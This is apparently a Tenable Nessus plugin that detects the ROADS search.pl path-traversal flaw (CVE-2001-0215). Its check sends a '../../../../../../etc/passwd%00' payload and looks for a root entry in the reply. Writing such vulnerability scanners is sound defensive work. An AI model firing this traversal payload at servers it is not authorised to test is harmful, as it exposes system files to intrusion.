#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10627);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-2001-0215");
 script_bugtraq_id(2371);
 script_osvdb_id(521);
 
 script_name(english:"ROADS search.pl form Parameter Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files can be read on the remote server." );
 script_set_attribute(attribute:"description", value:
"The 'search.pl' CGI from ROADS is installed. This CGI has a well known 
security flaw that lets an attacker read arbitrary files with the 
privileges of the HTTP daemon." );
 script_set_attribute(attribute:"solution", value:
"Remove it from /cgi-bin." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/03/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/02/12");
 script_cvs_date("$Date: 2011/03/14 21:48:12 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english: "Checks for the presence of /cgi-bin/search.pl");
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2001-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "webmirror.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

function check(url)
{
 local_var u, r, req;
 u = strcat(url, "/search.pl?form=../../../../../../etc/passwd%00");
 r = http_send_recv3(method: "GET", item: u, port:port);
 if (isnull(r)) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r[1]+r[2]))
 {				
  security_warning(port, extra: 
strcat('\nClicking on this URL should exhibit the flaw :\n\n', build_url(port: port, qs: u)));
  exit(0);
 }
}

check(url:"/ROADS/cgi-bin");
foreach dir (cgi_dirs())
{
check(url:dir);
}
